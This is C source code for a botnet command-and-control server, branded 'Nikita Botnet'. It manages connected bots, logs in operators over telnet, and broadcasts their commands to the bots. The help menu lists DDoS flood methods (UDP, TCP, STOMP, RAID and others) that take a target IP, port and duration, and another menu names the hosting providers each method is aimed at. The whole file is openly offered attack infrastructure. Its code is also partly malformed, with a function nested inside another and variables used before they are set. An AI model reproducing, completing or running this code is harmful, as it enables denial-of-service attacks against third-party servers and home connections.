#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct login_info {
	char username[10];
	char password[10];
};
static struct login_info accounts[20];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[0;36m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("%s\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}    
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void client_addr(struct sockaddr_in addr) 
{
	printf("\x1b[1;37m[ \x1b[1;37m%d.%d.%d.%d \x1b[1;37m]\n", 
	addr.sin_addr.s_addr & 0xFF,
	(addr.sin_addr.s_addr & 0xFF00)>>8,
	(addr.sin_addr.s_addr & 0xFF0000)>>16,
	(addr.sin_addr.s_addr & 0xFF000000)>>24);
}	
void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\x1b[0;36mUsername\x1b[1;37m:\e[0;36m ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\033[0;36mPassword\033[1;37m:\e[0;36m ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; ( %d ) %c", '\033', BotsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line10   [5000];
		char ascii_banner_line1   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line11   [5000];


sprintf(ascii_banner_line11,  "\033[2J\033[1;1H");
sprintf(ascii_banner_line10,  "\x1b[0;36m \r\n");
sprintf(ascii_banner_line1,   "\x1b[0;36mWelcome \x1b[1;37m[ %s ] \x1b[0;36mTo The Nikita Botnet\r\n", accounts[find_line].username); 
sprintf(ascii_banner_line8,   "\x1b[0;36m \r\n"); 

 
  if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;

		while(1) {
		char input [5000];
        sprintf(input, "\x1b[0;36m%s\x1b[1;37m@\x1b[0;36mNikita ~>\e[1;37m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
				if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "Help", 4) == 0) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls4  [800];
				char ls5  [800];
				char ls6  [800];
				char ls7  [800];
				char ls8  [800];
				char ls9  [800];
				char ls10 [800];
				char ls11 [800];
			
				
				sprintf(ls1,  "\x1b[0;36m!* UDP [IP] [PORT] [TIME] [32] [1460] [10]\x1b[0m\r\n");
				sprintf(ls2,  "\x1b[0;36m!* TCP [IP] [PORT] [TIME] [32] [all] [1460] [10]\x1b[0m\r\n");
				sprintf(ls4,  "\x1b[0;36m!* STOMP [IP] [PORT] [TIME] [32] [1460] [10]\x1b[0m\r\n");
				sprintf(ls5,  "\x1b[0;36m!* RAID [IP] [PORT] [TIME] [32] [all] [1460] [10]\x1b[0m\r\n");
				sprintf(ls6,  "\x1b[0;36m!* CNC [IP] [ADMIN PORT] [TIME]\x1b[0m\r\n");
                sprintf(ls7,  "\x1b[0;36m!* HOME [IP] [PORT] [TIME]\x1b[0m\r\n");
                sprintf(ls8,  "\x1b[0;36m!* STD [IP] [PORT] [TIME]\x1b[0m\r\n");
                sprintf(ls9,  "\x1b[0;36m!* STOP | STOPS ATTACKS\x1b[0m\r\n");
                sprintf(ls10, "\x1b[0;36m----------------------------------\x1b[1;37mExtra Commands\r\n");
                sprintf(ls11, "\x1b[0;36mMETHODS | SHOWS METHODS\r\n");
                		
				


				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls10, strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls11, strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\x1b[0;36m%s\x1b[1;37m@\x1b[0;36mNikita ~>\e[1;37m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
				if (strncmp(buf, "methods", 4) == 0 || strncmp(buf, "METHODS", 4) == 0 || strncmp(buf, "Methods", 4) == 0) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char method_1 [800];
				char method_2 [800];
				char method_3 [800];
				char method_4 [800];				
				char method_5 [800];
				char method_6 [800];
				
				sprintf(method_1,  "\x1b[0;36mHOME \x1b[1;37m: \x1b[0;36mUsed For Home Connections\r\n");
				sprintf(method_2,  "\x1b[0;36mSTD \x1b[1;37m: \x1b[0;36mUsed For NFOS And Other Servers\r\n");
				sprintf(method_3,  "\x1b[0;36mUDP \x1b[1;37m: \x1b[0;36mUsed For OVHS And Other Servers\r\n");
				sprintf(method_4,  "\x1b[0;36mTCP \x1b[1;37m: \x1b[0;36mUsed For Low End Servers\r\n");				
				sprintf(method_4,  "\x1b[0;36mSTOMP \x1b[1;37m: \x1b[0;36mStrictly NFO Method\r\n");
				sprintf(method_5,  "\x1b[0;36mCNC \x1b[1;37m: \x1b[0;36mUsed For CNC Flooding Servers\r\n");
				sprintf(method_6,  "\x1b[0;36mRAID \x1b[1;37m: \x1b[0;36mTCP Method Used For Servers\r\n");

				
				if(send(datafd, method_1,  strlen(method_1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, method_2,  strlen(method_2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, method_3,  strlen(method_3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, method_4,  strlen(method_4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, method_5,  strlen(method_5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, method_6,  strlen(method_6),	MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\x1b[0;36m%s\x1b[1;37m@\x1b[0;36mNikita ~>\e[1;37m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\x1b[0;36m%s\x1b[1;37m@\x1b[0;36mNikita ~>\e[1;37m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
            trim(buf);
			char input [5000];
        	sprintf(input, "\x1b[0;36m%s\x1b[1;37m@\x1b[0;36mNikita ~>\e[1;37m", accounts[find_line].username);
			if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("user.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("\x1b[0;36mIncoming Traffic: ");
                client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}